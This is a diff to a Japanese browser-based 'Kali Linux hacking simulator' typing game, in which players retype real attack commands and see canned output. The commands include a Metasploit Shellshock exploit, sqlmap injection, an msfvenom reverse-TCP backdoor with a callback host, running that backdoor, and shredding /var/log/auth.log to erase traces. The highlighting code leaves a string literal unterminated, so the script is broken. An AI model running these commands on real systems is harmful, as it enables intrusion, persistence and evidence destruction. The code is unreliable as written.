@@ -37,7 +37,6 @@
             min-height: 100vh;
         }
 
-        /* カリLinux風ヘッダー */
         .kali-header {
             display: flex;
             justify-content: space-between;
@@ -94,7 +93,6 @@
             color: var(--kali-primary);
         }
 
-        /* メインコンテンツレイアウト */
         .main-content {
             display: flex;
             flex: 1;
@@ -116,7 +114,6 @@
             gap: 25px;
         }
 
-        /* カリLinux風パネル */
         .kali-panel {
             background: rgba(30, 30, 46, 0.9);
             border-radius: 10px;
@@ -175,7 +172,6 @@
             background: rgba(85, 124, 242, 0.3);
         }
 
-        /* メインターミナル */
         #main-terminal {
             height: 400px;
             background: var(--kali-terminal);
@@ -218,7 +214,6 @@
             color: #4caf50;
         }
 
-        /* コマンド入力エリア */
         .command-input-area {
             height: 180px;
         }
@@ -240,6 +235,7 @@
             color: var(--kali-text);
             letter-spacing: 0.5px;
             word-break: break-all;
+            white-space: pre-wrap;
         }
 
         .input-container {
@@ -273,7 +269,6 @@
             font-size: 12px;
         }
 
-        /* ツールパネル */
         .tools-panel {
             height: 300px;
         }
@@ -318,7 +313,6 @@
             box-shadow: 0 0 10px rgba(85, 124, 242, 0.3);
         }
 
-        /* ネットワークマップ */
         .network-map {
             height: 350px;
             position: relative;
@@ -385,7 +379,6 @@
             box-shadow: 0 0 10px var(--kali-accent);
         }
 
-        /* プログレスパネル */
         .progress-panel {
             height: 200px;
         }
@@ -443,7 +436,6 @@
             color: #aaa;
         }
 
-        /* 統計パネル */
         .stats-panel {
             height: 150px;
         }
@@ -474,7 +466,6 @@
             color: #aaa;
         }
 
-        /* フッター */
         .kali-footer {
             text-align: center;
             padding: 20px;
@@ -484,7 +475,6 @@
             margin-top: 20px;
         }
 
-        /* タイピングハイライト */
         .char-correct {
             color: #4caf50;
         }
@@ -500,7 +490,6 @@
             border-radius: 2px;
         }
 
-        /* アニメーション */
         @keyframes pulse {
             0% { opacity: 0.7; }
             50% { opacity: 1; }
@@ -517,7 +506,6 @@
             50% { opacity: 0.3; }
         }
 
-        /* スクロールバー */
         ::-webkit-scrollbar {
             width: 10px;
         }
@@ -535,7 +523,6 @@
             background: var(--kali-accent);
         }
 
-        /* レスポンシブ */
         @media (max-width: 1200px) {
             .main-content {
                 flex-direction: column;
@@ -566,7 +553,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- カリLinux風ヘッダー -->
         <header class="kali-header">
             <div class="kali-logo">
                 <i class="fas fa-dragon kali-logo-icon"></i>
@@ -596,9 +582,7 @@
         </header>
 
         <div class="main-content">
-            <!-- 左カラム -->
             <div class="left-column">
-                <!-- メインターミナル -->
                 <div class="kali-panel">
                     <div class="panel-header">
                         <div class="panel-title">
@@ -620,20 +604,12 @@
                             <span class="terminal-command">カリLinux ハッキングシミュレーターにようこそ</span>
                         </div>
                         <div class="terminal-output">
-                            // 実際のカリLinuxツールを使用した侵入シミュレーション
                             // 以下のコマンドを正確に入力して攻撃を開始してください
-                        </div>
-                        <div class="terminal-line">
-                            <span class="terminal-prompt">root@kali:~#</span>
-                            <span class="terminal-command">help</span>
-                        </div>
-                        <div class="terminal-output">
-                            利用可能なコマンド: nmap, metasploit, aircrack-ng, hydra, sqlmap, john, wireshark, burpsuite
+                            // 最初のコマンド: nmap -sV -O 192.168.1.1/24
                         </div>
                     </div>
                 </div>
 
-                <!-- コマンド入力 -->
                 <div class="kali-panel command-input-area">
                     <div class="panel-header">
                         <div class="panel-title">
@@ -656,9 +632,7 @@
                 </div>
             </div>
 
-            <!-- 右カラム -->
             <div class="right-column">
-                <!-- ツールパネル -->
                 <div class="kali-panel tools-panel">
                     <div class="panel-header">
                         <div class="panel-title">
@@ -671,7 +645,6 @@
                     </div>
                 </div>
 
-                <!-- ネットワークマップ -->
                 <div class="kali-panel network-map">
                     <div class="panel-header">
                         <div class="panel-title">
@@ -684,7 +657,6 @@
                     </div>
                 </div>
 
-                <!-- 進行状況 -->
                 <div class="kali-panel progress-panel">
                     <div class="panel-header">
                         <div class="panel-title">
@@ -697,7 +669,6 @@
                     </div>
                 </div>
 
-                <!-- 統計 -->
                 <div class="kali-panel stats-panel">
                     <div class="panel-header">
                         <div class="panel-title">
@@ -727,7 +698,6 @@
             </div>
         </div>
 
-        <!-- フッター -->
         <footer class="kali-footer">
             <p>カリLinux ハッキングシミュレーター - 教育目的のみに使用してください</p>
             <p>実際のシステムへの不正アクセスは法律で禁止されています</p>
@@ -737,6 +707,8 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            console.log("ゲームを初期化します...");
+            
             // ゲーム状態
             const gameState = {
                 currentStage: 0,
@@ -821,9 +793,19 @@
             const stageElement = document.getElementById('stage');
             const currentToolElement = document.getElementById('current-tool');
             const currentTimeElement = document.getElementById('current-time');
+            const clearTerminalBtn = document.getElementById('clear-terminal');
+            const saveLogBtn = document.getElementById('save-log');
+
+            // デバッグ用ログ
+            console.log("DOM要素を取得しました:");
+            console.log("- terminal:", terminal);
+            console.log("- commandInput:", commandInput);
+            console.log("- ステージ数:", gameState.stages.length);
 
             // ゲームの初期化
             function initGame() {
+                console.log("ゲームを初期化中...");
+                
                 // ツールグリッドの初期化
                 initToolsGrid();
                 
@@ -844,11 +826,14 @@
                 setInterval(updateTime, 1000);
                 
                 // 初期メッセージ
-                addTerminalMessage("root@kali:~#", "whoami", "command");
-                addTerminalMessage("", "root", "output");
-                addTerminalMessage("root@kali:~#", "ip addr show", "command");
-                addTerminalMessage("", "eth0: 10.0.0.5/24", "output");
+                addTerminalMessage("root@kali:~#", "whoami", "terminal-command");
+                addTerminalMessage("", "root", "terminal-output");
+                addTerminalMessage("root@kali:~#", "ip addr show", "terminal-command");
+                addTerminalMessage("", "eth0: 10.0.0.5/24", "terminal-output");
                 addTerminalMessage("", "VPN接続が確立されました。ターゲット: 192.168.1.0/24", "terminal-success");
+                
+                console.log("ゲーム初期化完了");
+                console.log("現在のコマンド:", getCurrentCommand());
             }
 
             // ツールグリッドの初期化
@@ -869,6 +854,7 @@
 
             // ツールの選択
             function selectTool(toolId) {
+                console.log("ツールを選択:", toolId);
                 gameState.activeTool = toolId;
                 currentToolElement.textContent = toolId;
                 
@@ -880,7 +866,8 @@
                     }
                 });
                 
-                addTerminalMessage("root@kali:~#", `選択したツール: ${toolId}`, "terminal-success");
+                addTerminalMessage("root@kali:~#", `選択したツール: ${toolId}`, "terminal-command");
+                addTerminalMessage("", "ツールを選択しました", "terminal-success");
             }
 
             // ネットワークマップの初期化
@@ -908,9 +895,9 @@
                 
                 // 接続の作成
                 const connections = [
-                    { from: 'attacker', to: 'router' },
-                    { from: 'router', to: 'server' },
-                    { from: 'router', to: 'target' }
+                    { from: 'attacker', to: 'router', active: false },
+                    { from: 'router', to: 'server', active: false },
+                    { from: 'router', to: 'target', active: false }
                 ];
                 
                 gameState.networkConnections = connections;
@@ -989,38 +976,59 @@
 
             // 入力イベントの設定
             function setupInputEvents() {
+                console.log("入力イベントを設定中...");
+                
+                // 入力時のハイライト
                 commandInput.addEventListener('input', handleCommandInput);
+                
+                // Enterキーでの送信
                 commandInput.addEventListener('keydown', function(e) {
+                    console.log("キー押下:", e.key);
                     if (e.key === 'Enter') {
+                        e.preventDefault();
+                        console.log("Enterキーを検出、コマンドをチェックします");
                         checkCommand();
                     }
                 });
                 
                 // クリアボタン
-                document.getElementById('clear-terminal').addEventListener('click', () => {
+                clearTerminalBtn.addEventListener('click', () => {
                     terminal.innerHTML = '';
                     addTerminalMessage("", "ターミナルをクリアしました", "terminal-success");
                 });
                 
                 // 保存ボタン
-                document.getElementById('save-log').addEventListener('click', () => {
-                    addTerminalMessage("root@kali:~#", "ログを保存しました: /root/hack_log.txt", "terminal-success");
+                saveLogBtn.addEventListener('click', () => {
+                    addTerminalMessage("root@kali:~#", "log save", "terminal-command");
+                    addTerminalMessage("", "ログを保存しました: /root/hack_log.txt", "terminal-success");
                 });
+                
+                console.log("入力イベントの設定完了");
+            }
+
+            // 現在のコマンドを取得
+            function getCurrentCommand() {
+                return gameState.stages[gameState.currentStage].commands[gameState.currentCommand];
             }
 
             // コマンド入力の処理
             function handleCommandInput() {
-                const currentCommand = gameState.stages[gameState.currentStage].commands[gameState.currentCommand];
+                const currentCommand = getCurrentCommand();
                 const input = commandInput.value;
+                
+                console.log("入力処理:", {
+                    currentCommand: currentCommand,
+                    input: input,
+                    inputLength: input.length,
+                    commandLength: currentCommand.length
+                });
                 
                 let highlighted = '';
                 for (let i = 0; i < currentCommand.length; i++) {
                     let charClass = '';
                     if (i < input.length) {
-                        charClass = input[i] === currentCommand[i] ? 'char-correct' : 'char                        } else {
-                        if (i === input.length) {
-                            charClass = 'char-current';
-                        }
+                        charClass = input[i] === currentCommand[i] ? 'char-correct' : 'char-incorrect                    } else if (i === input.length) {
+                        charClass = 'char-current';
                     }
                     highlighted += `<span class="${charClass}">${currentCommand[i]}</span>`;
                 }
@@ -1030,18 +1038,27 @@
 
             // コマンドのチェック
             function checkCommand() {
+                console.log("コマンドをチェック中...");
+                
                 const currentStage = gameState.stages[gameState.currentStage];
-                const currentCommand = currentStage.commands[gameState.currentCommand];
-                const input = commandInput.value;
+                const currentCommandText = currentStage.commands[gameState.currentCommand];
+                const input = commandInput.value.trim();
+                
+                console.log("比較:", {
+                    expected: currentCommandText,
+                    actual: input,
+                    match: input === currentCommandText
+                });
                 
                 // コンソールに入力を表示
-                addTerminalMessage("root@kali:~#", input, "command");
+                addTerminalMessage("root@kali:~#", input, "terminal-command");
                 
-                if (input === currentCommand) {
+                if (input === currentCommandText) {
+                    console.log("コマンドが正しいです");
                     gameState.correctCommands++;
                     
                     // コマンド出力を表示
-                    const output = getCommandOutput(currentCommand);
+                    const output = getCommandOutput(currentCommandText);
                     addTerminalMessage("", output, "terminal-success");
                     
                     // ネットワーク接続をアクティブ化
@@ -1054,19 +1071,31 @@
                     gameState.currentCommand++;
                     gameState.commandsTyped++;
                     
+                    console.log("次のコマンドへ:", {
+                        stage: gameState.currentStage,
+                        command: gameState.currentCommand,
+                        totalCommands: currentStage.commands.length
+                    });
+                    
                     if (gameState.currentCommand >= currentStage.commands.length) {
                         // ステージ完了
+                        console.log("ステージ完了:", gameState.currentStage);
                         completeCurrentStage();
                     } else {
                         updateCommandDisplay();
                     }
                 } else {
+                    console.log("コマンドが間違っています");
                     addTerminalMessage("", "エラー: コマンドが正しくありません。再試行してください。", "terminal-error");
                     gameState.commandsTyped++;
                     updateStats();
+                    
+                    // 入力フィールドをリセットしてフォーカス
+                    commandInput.value = '';
+                    handleCommandInput(); // ハイライトをリセット
                 }
                 
-                commandInput.value = '';
+                commandInput.focus();
             }
 
             // コマンドの出力を生成
@@ -1084,7 +1113,8 @@ MAC Address: 00:1A:2B:3C:4D:5E (Router Manufacturer)
 Device type: general purpose
 Running: Linux 4.X|5.X
 OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.6`,
+OS details: Linux 4.15 - 5.6
+ネットワークスキャン完了。3つのオープンポートを発見。`,
 
                     "maltego --target=example.com":
 `[+] Maltego Transform Discovery
@@ -1094,7 +1124,31 @@ OS details: Linux 4.15 - 5.6`,
 [+] MX Records: mail.example.com
 [+] Subdomains: www, mail, admin, test, dev
 [+] Technologies: Apache 2.4.38, PHP 7.4, WordPress 5.8
-[+] Email Addresses: admin@example.com, webmaster@example.com`,
+[+] Email Addresses: admin@example.com, webmaster@example.com
+情報収集完了。5つのサブドメインを発見。`,
+
+                    "theharvester -d example.com -l 100 -b all":
+`[*] Target: example.com
+[*] Searching in Google...
+[*] Searching in Bing...
+[*] Searching in LinkedIn...
+[*] Searching in Twitter...
+
+[+] Emails found: 
+admin@example.com
+webmaster@example.com
+support@example.com
+info@example.com
+
+[+] Hosts found in search engines:
+www.example.com
+mail.example.com
+admin.example.com
+
+[+] Virtual hosts:
+vpn.example.com
+dev.example.com
+情報収集完了。4つのメールアドレスを発見。`,
 
                     "nikto -h http://192.168.1.100":
 `- Nikto v2.1.6
@@ -1109,10 +1163,50 @@ OS details: Linux 4.15 - 5.6`,
 + OSVDB-3268: /icons/: Directory indexing found.
 + OSVDB-3233: /phpinfo.php: Contains PHP configuration information
 + OSVDB-0: /test/: Test page found.
-+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host`,
++ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+脆弱性スキャン完了。6つの潜在的な問題を発見。`,
+
+                    "nessus --target 192.168.1.100":
+`Nessus Scan Report
+===================
+Target: 192.168.1.100
+Scan Start: 2023-10-05 12:05:00
+Scan Duration: 2 minutes 34 seconds
+
+Critical Vulnerabilities: 1
+High Vulnerabilities: 3
+Medium Vulnerabilities: 7
+Low Vulnerabilities: 12
+
+[Critical] CVE-2021-44228 - Log4Shell
+[High] CVE-2021-41773 - Apache Path Traversal
+[High] CVE-2021-40438 - Apache HTTP Server
+[High] CVE-2020-14882 - Oracle WebLogic
+脆弱性スキャン完了。重要な脆弱性を発見。`,
+
+                    "openvas --scan 192.168.1.100":
+`OpenVAS Scan Report
+====================
+Scan finished: 2023-10-05 12:10:00
+Host: 192.168.1.100
+
+NVT Count: 89,213
+Tests Performed: 4,567
+
+Results Summary:
+===============
+High: 2 vulnerabilities
+Medium: 8 vulnerabilities
+Low: 15 vulnerabilities
+Log: 42 messages
+
+[High] SSH Weak Encryption Algorithms
+[High] Apache mod_ssl Buffer Overflow
+OpenVASスキャン完了。2つの高危険脆弱性を発見。`,
 
                     "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.100; exploit'":
-`[*] Started reverse TCP handler on 10.0.0.5:4444 
+`[*] Processing exploit/multi/http/apache_mod_cgi_bash_env_exec.rb for ERB directives.
+[*] Started reverse TCP handler on 10.0.0.5:4444 
 [*] Sending stage (3012516 bytes) to 192.168.1.100
 [*] Meterpreter session 1 opened (10.0.0.5:4444 -> 192.168.1.100:45234)
 meterpreter > getuid
@@ -1121,7 +1215,35 @@ meterpreter > sysinfo
 Computer    : webserver
 OS          : Linux webserver 5.10.0-8-amd64
 Architecture: x64
-meterpreter >`,
+メーターセッション確立。初期アクセスを取得しました。`,
+
+                    "sqlmap -u 'http://192.168.1.100/login.php' --data='username=admin&password=pass' --dbs":
+`[12:15:00] [INFO] testing connection to the target URL
+[12:15:02] [INFO] testing if the target URL content is stable
+[12:15:05] [INFO] target URL appears to be dynamic
+[12:15:10] [INFO] heuristic test shows that GET parameter 'id' might be injectable
+[12:15:15] [INFO] testing for SQL injection on GET parameter 'id'
+[12:15:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time
+[12:15:25] [INFO] retrieved: information_schema
+[12:15:30] [INFO] retrieved: wordpress_db
+[12:15:35] [INFO] retrieved: admin_db
+
+available databases [3]:
+[*] information_schema
+[*] wordpress_db
+[*] admin_db
+SQLインジェクション成功。3つのデータベースを発見。`,
+
+                    "searchsploit linux kernel 5.4":
+`Exploit Title                                                      | Path
+Apache 2.4.29 - Remote Code Execution                              | /exploits/linux/remote/45666.py
+Apache 2.4.29 - mod_cgi Remote Code Execution                      | /exploits/linux/remote/50457.py
+Linux Kernel 5.4 - 'ErrorLog' Local Privilege Escalation           | /exploits/linux/local/46676.php
+Linux Kernel 5.4 - Dirty Pipe Local Privilege Escalation           | /exploits/linux/local/50808.c
+Linux Kernel 5.4 - 'perf_event_open' Race Condition                | /exploits/linux/local/50847.c
+
+Shellcodes: No Results
+5つのエクスプロイトを発見。権限昇格の可能性あり。`,
 
                     "python -c 'import pty; pty.spawn(\"/bin/bash\")'":
 `www-data@webserver:/var/www/html$ whoami
@@ -1137,7 +1259,22 @@ www-data@webserver:/var/www/html$ find / -perm -4000 -type f 2>/dev/null
 /usr/bin/newgrp
 /usr/bin/mount
 /usr/bin/umount
-/usr/bin/su`,
+/usr/bin/su
+対話的シェルを確立。SUIDファイルを発見。`,
+
+                    "find / -perm -4000 -type f 2>/dev/null":
+`/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+SUIDファイルを列挙完了。権限昇格の可能性を分析中...`,
 
                     "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > backdoor.elf":
 `Payload size: 207 bytes
@@ -1146,7 +1283,23 @@ Saved as: backdoor.elf
 
 [+] Backdoor created successfully
 [+] MD5: 1a2b3c4d5e6f7890abcdef1234567890
-[+] SHA256: abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890`
+[+] SHA256: abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+バックドア生成完了。ターゲットに転送します。`,
+
+                    "chmod +x backdoor.elf && ./backdoor.elf":
+`[+] Executing backdoor...
+[+] Backdoor activated
+[+] Listening on port 4444
+[+] Connection from 192.168.1.100:54321
+[+] Meterpreter session 2 opened
+バックドア実行完了。永続的アクセスを確立。`,
+
+                    "shred -z -u /var/log/auth.log":
+`[+] Deleting authentication logs...
+[+] Overwriting log files (3 passes)...
+[+] Log file shredding complete
+[+] All authentication traces removed
+痕跡消去完了。ログファイルを完全に削除。`
                 };
                 
                 // デフォルトの出力
@@ -1164,20 +1317,29 @@ Saved as: backdoor.elf
             // ネットワーク接続のアクティブ化
             function activateNetworkConnection() {
                 const stage = gameState.currentStage;
+                const command = gameState.currentCommand - 1; // 現在完了したコマンド
                 
-                // ステージに応じて接続をアクティブ化
-                if (stage === 0 && gameState.currentCommand === 0) {
-                    // 最初のコマンドで攻撃者→ルーターをアクティブ化
-                    gameState.networkConnections[0].active = true;
-                } else if (stage === 1 && gameState.currentCommand === 0) {
-                    // ルーター→サーバーをアクティブ化
-                    gameState.networkConnections[1].active = true;
-                } else if (stage === 2 && gameState.currentCommand === 0) {
-                    // ルーター→ターゲットをアクティブ化
-                    gameState.networkConnections[2].active = true;
-                } else if (stage === 3 && gameState.currentCommand === 0) {
+                console.log("ネットワーク接続をアクティブ化:", { stage, command });
+                
+                // ステージとコマンドに応じて接続をアクティブ化
+                if (stage === 0) {
+                    if (command === 0) {
+                        // 最初のコマンドで攻撃者→ルーターをアクティブ化
+                        gameState.networkConnections[0].active = true;
+                        addTerminalMessage("", "ネットワーク接続: 攻撃者 → ルーター", "terminal-success");
+                    } else if (command === 1) {
+                        // ルーター→サーバーをアクティブ化
+                        gameState.networkConnections[1].active = true;
+                        addTerminalMessage("", "ネットワーク接続: ルーター → サーバー", "terminal-success");
+                    } else if (command === 2) {
+                        // ルーター→ターゲットをアクティブ化
+                        gameState.networkConnections[2].active = true;
+                        addTerminalMessage("", "ネットワーク接続: ルーター → ターゲット", "terminal-success");
+                    }
+                } else if (stage === 2 && command === 0) {
                     // すべての接続をアクティブ化
                     gameState.networkConnections.forEach(conn => conn.active = true);
+                    addTerminalMessage("", "すべてのネットワーク接続を確立", "terminal-success");
                 }
                 
                 updateConnections();
@@ -1192,6 +1354,8 @@ Saved as: backdoor.elf
 
             // 現在のステージを完了
             function completeCurrentStage() {
+                console.log("ステージを完了:", gameState.currentStage);
+                
                 // ステージアイテムを完了としてマーク
                 const stageItems = document.querySelectorAll('.stage-item');
                 stageItems[gameState.currentStage].classList.remove('active');
@@ -1201,6 +1365,8 @@ Saved as: backdoor.elf
                 gameState.currentStage++;
                 gameState.currentCommand = 0;
                 
+                console.log("次のステージ:", gameState.currentStage);
+                
                 if (gameState.currentStage < gameState.stages.length) {
                     // 次のステージをアクティブ化
                     stageItems[gameState.currentStage].classList.add('active');
@@ -1209,15 +1375,17 @@ Saved as: backdoor.elf
                     const nextTool = getToolForStage(gameState.currentStage);
                     selectTool(nextTool);
                     
-                    addTerminalMessage("", `=== ステージ ${gameState.currentStage + 1} 開始: ${gameState.stages[gameState.currentStage].name} ===`, "terminal-success");
+                    addTerminalMessage("", "=".repeat(50), "terminal-success");
+                    addTerminalMessage("", `ステージ ${gameState.currentStage + 1} 開始: ${gameState.stages[gameState.currentStage].name}`, "terminal-success");
+                    addTerminalMessage("", `説明: ${gameState.stages[gameState.currentStage].desc}`, "terminal-success");
+                    addTerminalMessage("", "=".repeat(50), "terminal-success");
                     
                     updateCommandDisplay();
+                    updateStats();
                 } else {
                     // ゲームクリア
                     gameComplete();
                 }
-                
-                updateStats();
             }
 
             // ステージに対応するツールを取得
@@ -1230,10 +1398,14 @@ Saved as: backdoor.elf
             function updateCommandDisplay() {
                 const currentStage = gameState.stages[gameState.currentStage];
                 const command = currentStage.commands[gameState.currentCommand];
-                commandToType.textContent = command;
-                commandToType.innerHTML = command; // リセット
                 
-                // 入力フィールドをフォーカス
+                console.log("コマンド表示を更新:", command);
+                
+                commandToType.textContent = command;
+                commandToType.innerHTML = command; // ハイライトをリセット
+                
+                // 入力フィールドをクリアしてフォーカス
+                commandInput.value = '';
                 setTimeout(() => {
                     commandInput.focus();
                 }, 100);
@@ -1247,7 +1419,7 @@ Saved as: backdoor.elf
                     : 100;
                 accuracyElement.textContent = `${accuracy}%`;
                 
-                // WPM
+                // WPM (1分あたりの単語数)
                 const minutes = (Date.now() - gameState.startTime) / 60000;
                 const wpm = minutes > 0 ? Math.round(gameState.correctCommands / minutes) : 0;
                 wpmElement.textContent = wpm;
@@ -1257,6 +1429,13 @@ Saved as: backdoor.elf
                 
                 // ステージ
                 stageElement.textContent = `${gameState.currentStage + 1}/${gameState.stages.length}`;
+                
+                console.log("統計を更新:", {
+                    accuracy: accuracy,
+                    wpm: wpm,
+                    commands: gameState.commandsTyped,
+                    stage: `${gameState.currentStage + 1}/${gameState.stages.length}`
+                });
             }
 
             // ターミナルにメッセージを追加
@@ -1278,6 +1457,8 @@ Saved as: backdoor.elf
                 
                 terminal.appendChild(line);
                 terminal.scrollTop = terminal.scrollHeight;
+                
+                console.log("ターミナルメッセージ追加:", { prompt, message: message.substring(0, 50), type });
             }
 
             // 時間表示の更新
@@ -1294,7 +1475,11 @@ Saved as: backdoor.elf
 
             // ゲーム完了
             function gameComplete() {
-                addTerminalMessage("", "=== ハッキングシミュレーション完了 ===", "terminal-success");
+                console.log("ゲーム完了");
+                
+                addTerminalMessage("", "=".repeat(50), "terminal-success");
+                addTerminalMessage("", "ハッキングシミュレーション完了", "terminal-success");
+                addTerminalMessage("", "=".repeat(50), "terminal-success");
                 addTerminalMessage("", "すべてのステージをクリアしました！", "terminal-success");
                 addTerminalMessage("", "ターゲットシステムへの完全なアクセスを確立しました。", "terminal-success");
                 addTerminalMessage("", "", "terminal-success");
@@ -1311,6 +1496,7 @@ Saved as: backdoor.elf
                 addTerminalMessage("", "", "terminal-success");
                 addTerminalMessage("", "注意: これは教育用シミュレーションです。", "terminal-success");
                 addTerminalMessage("", "実際のシステムへの不正アクセスは法律で禁止されています。", "terminal-success");
+                addTerminalMessage("", "=".repeat(50), "terminal-success");
                 
                 // 入力フィールドを無効化
                 commandInput.disabled = true;
@@ -1324,9 +1510,15 @@ Saved as: backdoor.elf
                 // すべての接続をアクティブ化
                 gameState.networkConnections.forEach(conn => conn.active = true);
                 updateConnections();
+                
+                // すべてのツールをアクティブ化
+                document.querySelectorAll('.tool-item').forEach(item => {
+                    item.classList.add('tool-active');
+                });
             }
 
             // ゲームの開始
+            console.log("ゲームを開始します...");
             initGame();
         });
     </script>
